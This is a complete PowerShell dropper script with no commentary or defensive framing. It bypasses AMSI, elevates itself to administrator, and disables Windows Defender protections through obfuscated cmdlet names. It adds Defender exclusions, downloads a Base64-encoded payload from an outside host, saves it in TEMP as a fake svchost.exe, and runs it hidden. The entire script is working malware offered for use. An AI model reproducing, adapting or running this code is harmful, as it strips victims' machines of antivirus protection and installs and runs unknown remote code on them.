# AMSI bypass
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Self-elevate
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")) {
    Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`""
    exit
}

# Disable Defender (obfuscated)
$p1='Set-MpPref';$p2='erence';$cmd=$p1+$p2
$props=@('DisableRealtimeMonitoring','DisableIOAVProtection','DisableNetworkProtection','DisableBehaviorMonitoring','DisableBlockAtFirstSeen','DisableCloudProtection','DisableArchiveScanning','DisableScriptScanning')
foreach($prop in $props){& $cmd -$prop $true -Force}
$excl='Add-MpPref'+'erence'
& $excl -ExclusionPath "$env:TEMP" -Force
& $excl -ExclusionPath "$env:ProgramData" -Force
& $excl -ExclusionProcess "svchost.exe" -Force
& $excl -ExclusionProcess "powershell.exe" -Force

# Download Base64
$wc = New-Object System.Net.WebClient
$wc.Headers.Add('User-Agent','Mozilla/5.0')
$b64 = $wc.DownloadString('https://kekman.space/encoded.txt')
$b64 = $b64.Trim() -replace "`r`n", "" -replace "`n", "" -replace " ", ""

# Decode to bytes
$bytes = [Convert]::FromBase64String($b64)

# Write to a fixed file name in TEMP
$out = "$env:TEMP\svchost.exe"
[System.IO.File]::WriteAllBytes($out, $bytes)

# Wait a moment for the file to be fully written
Start-Sleep -Milliseconds 500

# Execute the file with explicit full path
Start-Process -FilePath $out -WindowStyle Hidden

# Optional: log success
"Executed $out" | Out-File "$env:TEMP\exec.log"